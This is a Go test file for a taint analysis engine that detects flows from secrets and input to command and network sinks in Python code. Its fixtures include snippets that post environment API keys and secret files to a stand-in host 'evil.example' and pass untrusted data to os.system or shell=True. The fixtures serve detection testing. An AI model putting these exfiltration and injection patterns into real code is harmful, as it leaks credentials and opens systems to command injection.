package cpg

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"
)

// ---------------------------------------------------------------------------
// Helpers.
//
// Every package level helper of this file is prefixed with "taint" so that it
// cannot collide with the helpers owned by the sibling test files of the
// package (builder helpers use "builder", microservice helpers use
// "microservice" and the concurrent scope slicer uses "scopeSlicer").
// ---------------------------------------------------------------------------

// taintBuildSnippet parses a python snippet and converts it into a standalone
// CPG. The snippet is reported under the given virtual file path.
func taintBuildSnippet(t *testing.T, filePath, source string) *CodePropertyGraph {
	t.Helper()

	mod, err := ExtractASTSource(context.Background(), source)
	if err != nil {
		t.Fatalf("ExtractASTSource(%s) failed: %v", filePath, err)
	}

	g := NewCodePropertyGraph()
	if err := NewCPGBuilder(NewSymbolResolver("")).BuildFile(g, filePath, mod); err != nil {
		t.Fatalf("BuildFile(%s) failed: %v", filePath, err)
	}
	return g
}

// taintWritePython writes one python file below root and returns its path.
func taintWritePython(t *testing.T, root, rel, source string) string {
	t.Helper()

	path := filepath.Join(root, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("create directory for %s: %v", rel, err)
	}
	if err := os.WriteFile(path, []byte(source), 0o644); err != nil {
		t.Fatalf("write %s: %v", rel, err)
	}
	return path
}

// taintBuildWorkspace writes every python file into a fresh temporary
// workspace, indexes the workspace with a SymbolResolver and converts all files
// into one CPG.
func taintBuildWorkspace(t *testing.T, files map[string]string) *CodePropertyGraph {
	t.Helper()

	root := t.TempDir()
	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names)

	paths := make([]string, 0, len(names))
	for _, name := range names {
		paths = append(paths, taintWritePython(t, root, name, files[name]))
	}

	resolver := NewSymbolResolver(root)
	if err := resolver.Scan(); err != nil {
		t.Fatalf("resolver scan failed: %v", err)
	}

	g := NewCodePropertyGraph()
	if err := NewCPGBuilder(resolver).Build(g, paths); err != nil {
		t.Fatalf("CPG build failed: %v", err)
	}
	return g
}

// taintFindCall returns the CPG call node of the given dotted callee name.
func taintFindCall(t *testing.T, g *CodePropertyGraph, callee string) *CPGNode {
	t.Helper()

	for _, node := range g.FindNodesByType(AST_CALL) {
		if node != nil && node.SymbolName == callee {
			return node
		}
	}
	t.Fatalf("no call node for callee %q", callee)
	return nil
}

// taintAssignNodeAt returns the assignment node registered on the given line.
func taintAssignNodeAt(t *testing.T, g *CodePropertyGraph, line int) *CPGNode {
	t.Helper()

	for _, node := range g.FindNodesByType(AST_ASSIGN) {
		if node != nil && node.Line == line {
			return node
		}
	}
	t.Fatalf("no assignment node at line %d", line)
	return nil
}

// taintChainSnippet builds a python snippet holding an environment source, n
// plain assignment hops and a command sink.
func taintChainSnippet(n int) string {
	var b strings.Builder
	b.WriteString("import os\nimport subprocess\n\n")
	b.WriteString("secret = os.environ.get(\"K\")\n")
	b.WriteString("hop1 = secret\n")
	for i := 2; i <= n; i++ {
		fmt.Fprintf(&b, "hop%d = hop%d\n", i, i-1)
	}
	fmt.Fprintf(&b, "subprocess.run(hop%d, shell=True)\n", n)
	return b.String()
}

// ---------------------------------------------------------------------------
// Taint engine tests
// ---------------------------------------------------------------------------

// TestTaintEngine_EnvironmentToCommand covers the smallest end to end flow: an
// environment variable read into a local variable that is handed to a command
// execution sink.
func TestTaintEngine_EnvironmentToCommand(t *testing.T) {
	g := taintBuildSnippet(t, "service_a/loader.py", `import os
import subprocess

def run():
    key = os.environ["K"]
    subprocess.run(key, shell=True)
`)

	violations := NewInterProceduralTaintEngine().FindViolations(g)
	if len(violations) != 1 {
		t.Fatalf("expected exactly one violation, got %d: %+v", len(violations), violations)
	}

	violation := violations[0]
	if violation.SourceFamily != "ENV_001" {
		t.Fatalf("expected source family ENV_001, got %q", violation.SourceFamily)
	}
	if violation.SinkFamily != "CMD_001" {
		t.Fatalf("expected sink family CMD_001, got %q", violation.SinkFamily)
	}
	if len(violation.Steps) < 2 {
		t.Fatalf("expected a source and a sink step, got %+v", violation.Steps)
	}
	if violation.Steps[0].Type != "SOURCE" || violation.Steps[0].EdgeType != "" {
		t.Fatalf("unexpected source step %+v", violation.Steps[0])
	}
	if violation.Steps[len(violation.Steps)-1].Type != "SINK" {
		t.Fatalf("unexpected sink step %+v", violation.Steps[len(violation.Steps)-1])
	}
	if violation.AcrossMicroservice {
		t.Fatalf("a single file flow must not cross a microservice boundary")
	}
}

// TestTaintEngine_CredentialExfiltration covers the family upgrade rule: an
// environment source reaching a network sink is reported as an exfiltration.
func TestTaintEngine_CredentialExfiltration(t *testing.T) {
	g := taintBuildSnippet(t, "service_a/client.py", `import os
import requests

key = os.environ.get("API_KEY")
requests.post("http://evil.example/collect", json=key)
`)

	violations := NewInterProceduralTaintEngine().FindViolations(g)
	if len(violations) != 1 {
		t.Fatalf("expected exactly one violation, got %d: %+v", len(violations), violations)
	}
	if violations[0].SourceFamily != "ENV_001" {
		t.Fatalf("expected source family ENV_001, got %q", violations[0].SourceFamily)
	}
	if violations[0].SinkFamily != "EXF_001" {
		t.Fatalf("expected sink family EXF_001, got %q", violations[0].SinkFamily)
	}
}

// TestTaintEngine_CrossMicroserviceFlow covers the boundary penetration: an
// environment source leaves one service through an HTTP client call and is
// consumed by a command sink inside the handler of another service.
func TestTaintEngine_CrossMicroserviceFlow(t *testing.T) {
	g := taintBuildWorkspace(t, map[string]string{
		"service_a/client.py": `import os
import requests

payload = os.environ.get("SECRET")
requests.post("http://sidecar:8080/v1/telemetry", json=payload)
`,
		"service_b/server.py": `import os
from flask import Flask, request

app = Flask(__name__)

@app.post("/v1/telemetry")
def telemetry():
    data = request.get_json()
    os.system(data)
`,
	})

	if links := NewMicroserviceBoundaryBridge().BridgeBoundaries(g); links == 0 {
		t.Fatalf("microservice bridge created no boundary link")
	}

	violations := NewInterProceduralTaintEngine().FindViolations(g)

	var crossed *TaintViolation
	for _, violation := range violations {
		if violation.AcrossMicroservice && violation.CrossFile {
			crossed = violation
			break
		}
	}
	if crossed == nil {
		t.Fatalf("expected a cross microservice violation, got %d violations: %+v", len(violations), violations)
	}
	if crossed.SourceFamily != "ENV_001" {
		t.Fatalf("expected source family ENV_001, got %q", crossed.SourceFamily)
	}
	if crossed.SinkFamily != "CMD_001" {
		t.Fatalf("expected sink family CMD_001, got %q", crossed.SinkFamily)
	}

	boundarySteps := 0
	for _, step := range crossed.Steps {
		if strings.HasPrefix(step.EdgeType, "MICROSERVICE_") {
			boundarySteps++
		}
	}
	if boundarySteps == 0 {
		t.Fatalf("expected a step traversed through a MICROSERVICE_ edge, got %+v", crossed.Steps)
	}
	if len(crossed.Steps) < 3 {
		t.Fatalf("expected at least a source, a boundary and a sink step, got %+v", crossed.Steps)
	}
}

// TestTaintEngine_SanitizerBlocksFlow covers the sanitizer rule: a hashing call
// in the middle of the path blocks the propagation.
func TestTaintEngine_SanitizerBlocksFlow(t *testing.T) {
	g := taintBuildSnippet(t, "service_a/client.py", `import os
import hashlib
import requests

key = os.environ.get("API_KEY")
digest = hashlib.sha256(key.encode()).hexdigest()
requests.post("http://evil.example/collect", json=digest)
`)

	violations := NewInterProceduralTaintEngine().FindViolations(g)
	if len(violations) != 0 {
		t.Fatalf("a sanitized flow must not produce a violation, got %+v", violations)
	}
}

// TestTaintEngine_MaxHopsAndCycles covers the path budget and the termination
// guarantee of the worklist on a graph holding a cycle.
func TestTaintEngine_MaxHopsAndCycles(t *testing.T) {
	// A chain of 20 assignment hops needs 21 hops from the source to the sink.
	const chainLength = 20

	g := taintBuildSnippet(t, "service_a/chain.py", taintChainSnippet(chainLength))

	short := NewInterProceduralTaintEngine()
	short.MaxHops = 5
	if violations := short.FindViolations(g); len(violations) != 0 {
		t.Fatalf("a path longer than MaxHops must yield no violation, got %+v", violations)
	}

	long := NewInterProceduralTaintEngine()
	violations := long.FindViolations(g)
	if len(violations) != 1 {
		t.Fatalf("expected exactly one violation with the default path budget, got %d: %+v", len(violations), violations)
	}
	if violations[0].SinkFamily != "CMD_001" {
		t.Fatalf("expected sink family CMD_001, got %q", violations[0].SinkFamily)
	}

	// A cyclic graph: the sink is rewired back to the source, so the worklist
	// revisits the same nodes forever unless the visited set terminates it.
	cyclic := taintBuildSnippet(t, "service_a/cycle.py", `import os

a = os.environ.get("K")
b = a
a = b
os.system(a)
`)
	source := taintAssignNodeAt(t, cyclic, 3)
	sink := taintFindCall(t, cyclic, "os.system")
	if err := cyclic.AddEdge(&CPGEdge{
		SourceID: sink.NodeID,
		TargetID: source.NodeID,
		EdgeType: DFG_DEF_USE,
	}); err != nil {
		t.Fatalf("adding the cycle edge failed: %v", err)
	}

	done := make(chan []*TaintViolation, 1)
	go func() {
		done <- NewInterProceduralTaintEngine().FindViolations(cyclic)
	}()

	select {
	case result := <-done:
		if len(result) == 0 {
			t.Fatalf("the cyclic flow still holds the direct source to sink path")
		}
	case <-time.After(30 * time.Second):
		t.Fatalf("taint engine did not terminate on a cyclic graph")
	}
}

// TestTaintEngine_FamilyMatrix covers the remaining source families and the
// family upgrade matrix of the engine.
func TestTaintEngine_FamilyMatrix(t *testing.T) {
	cases := []struct {
		name         string
		source       string
		sourceFamily string
		sinkFamily   string
	}{
		{
			name: "file to network is an exfiltration",
			source: `import requests

content = open("secrets.txt").read_text()
requests.post("http://evil.example/collect", data=content)
`,
			sourceFamily: "FIL_001",
			sinkFamily:   "EXF_001",
		},
		{
			name: "raw data to command stays a command",
			source: `import os
import pandas as pd

frame = pd.read_csv("dataset.csv")
os.system(frame)
`,
			sourceFamily: "RAW_DATA",
			sinkFamily:   "CMD_001",
		},
		{
			name: "raw data to network is a plain network sink",
			source: `import requests
import pandas as pd

frame = pd.read_csv("dataset.csv")
requests.put("http://api.example/rows", json=frame)
`,
			sourceFamily: "RAW_DATA",
			sinkFamily:   "NET_001",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			g := taintBuildSnippet(t, "svc/module.py", tc.source)

			violations := NewInterProceduralTaintEngine().FindViolations(g)
			if len(violations) != 1 {
				t.Fatalf("expected exactly one violation, got %d: %+v", len(violations), violations)
			}
			if violations[0].SourceFamily != tc.sourceFamily {
				t.Fatalf("expected source family %s, got %s", tc.sourceFamily, violations[0].SourceFamily)
			}
			if violations[0].SinkFamily != tc.sinkFamily {
				t.Fatalf("expected sink family %s, got %s", tc.sinkFamily, violations[0].SinkFamily)
			}
		})
	}
}

// TestEvidenceSlicer_TrajectoryFormat covers the rendering contract of the
// pruned causal chain.
func TestEvidenceSlicer_TrajectoryFormat(t *testing.T) {
	g := taintBuildWorkspace(t, map[string]string{
		"service_a/client.py": `import os
import requests

payload = os.environ.get("SECRET")
requests.post("http://sidecar:8080/v1/telemetry", json=payload)
`,
		"service_b/server.py": `import os
from flask import Flask, request

app = Flask(__name__)

@app.post("/v1/telemetry")
def telemetry():
    data = request.get_json()
    os.system(data)
`,
	})
	NewMicroserviceBoundaryBridge().BridgeBoundaries(g)

	violations := NewInterProceduralTaintEngine().FindViolations(g)
	if len(violations) == 0 {
		t.Fatalf("expected at least one violation to render")
	}

	var crossed *TaintViolation
	for _, violation := range violations {
		if violation.AcrossMicroservice {
			crossed = violation
			break
		}
	}
	if crossed == nil {
		t.Fatalf("expected a cross microservice violation, got %+v", violations)
	}

	text := NewCPGEvidenceSlicer().FormatTrajectory(crossed, g)
	t.Logf("trajectory:\n%s", text)

	if !strings.HasPrefix(text, "[Deep Audit Inter-Procedural Taint Trajectory]\n") {
		t.Fatalf("trajectory must start with the documented header, got:\n%s", text)
	}
	if !strings.Contains(text, "\nSource: ") {
		t.Fatalf("trajectory must render a source line, got:\n%s", text)
	}
	if !strings.Contains(text, "\n  ↳ [") {
		t.Fatalf("trajectory must render step lines, got:\n%s", text)
	}

	lines := strings.Split(text, "\n")
	last := lines[len(lines)-1]
	if !strings.Contains(last, "[SINK: ") {
		t.Fatalf("trajectory must end with a sink step, got:\n%s", text)
	}
	if !strings.Contains(last, crossed.SinkFamily) {
		t.Fatalf("the sink step must name the sink family %q, got %q", crossed.SinkFamily, last)
	}
	if len(text) > 1200 {
		t.Fatalf("trajectory must stay under 1200 characters, got %d", len(text))
	}
}

// TestEvidenceSlicer_CompressionAndBudget covers evidence compression: a long
// trajectory keeps a bounded number of steps with an elision marker, and a
// trajectory made of very long code excerpts is still truncated into the
// character budget.
func TestEvidenceSlicer_CompressionAndBudget(t *testing.T) {
	long := &TaintViolation{
		SourceFamily: "RAW_DATA",
		SinkFamily:   "CMD_001",
	}
	long.Steps = append(long.Steps, TaintStep{
		Step: 1, Type: "SOURCE", File: "svc/a.py", Line: 10,
		Code: "key = os.environ.get('API_KEY')",
	})
	for i := 2; i <= 11; i++ {
		long.Steps = append(long.Steps, TaintStep{
			Step: i, Type: "INTER_PROC_CALL", File: "svc/a.py", Line: 10 + i,
			Code: fmt.Sprintf("handler_%d(payload)", i), EdgeType: "CALL_ARG",
		})
	}
	long.Steps = append(long.Steps, TaintStep{
		Step: 12, Type: "SINK", File: "svc/a.py", Line: 30,
		Code: "os.system(cmd)", EdgeType: "CALL_ARG",
	})

	text := NewCPGEvidenceSlicer().FormatTrajectory(long, nil)
	if !strings.Contains(text, "intermediate steps elided") {
		t.Fatalf("a compressed trajectory must mark the dropped steps, got:\n%s", text)
	}
	if lines := strings.Count(text, "\n  ↳ ["); lines > 7 {
		t.Fatalf("a trajectory must keep at most 7 steps, got %d:\n%s", lines, text)
	}
	if !strings.HasSuffix(text, "[SINK: CMD_001] os.system(cmd) in svc/a.py:30") {
		t.Fatalf("compression must keep the sink step, got:\n%s", text)
	}
	if len(text) > 1200 {
		t.Fatalf("trajectory must stay under 1200 characters, got %d", len(text))
	}

	// Oversized code excerpts are truncated so that the budget always holds.
	wide := &TaintViolation{SourceFamily: "RAW_DATA", SinkFamily: "CMD_001"}
	wide.Steps = append(wide.Steps, TaintStep{
		Step: 1, Type: "SOURCE", File: "svc/a.py", Line: 10,
		Code: strings.Repeat("read_everything(", 60),
	})
	for i := 2; i < 7; i++ {
		wide.Steps = append(wide.Steps, TaintStep{
			Step: i, Type: "INTER_PROC_CALL", File: "svc/a.py", Line: 10 + i,
			Code: strings.Repeat("propagate_", 60), EdgeType: "CALL_ARG",
		})
	}
	wide.Steps = append(wide.Steps, TaintStep{
		Step: 7, Type: "SINK", File: "svc/a.py", Line: 40,
		Code: strings.Repeat("os.system(", 60), EdgeType: "CALL_ARG",
	})

	truncated := NewCPGEvidenceSlicer().FormatTrajectory(wide, nil)
	if len(truncated) > 1200 {
		t.Fatalf("trajectory must stay under 1200 characters, got %d", len(truncated))
	}
	if !strings.Contains(truncated, "...") {
		t.Fatalf("oversized code excerpts must be truncated, got:\n%s", truncated)
	}
}
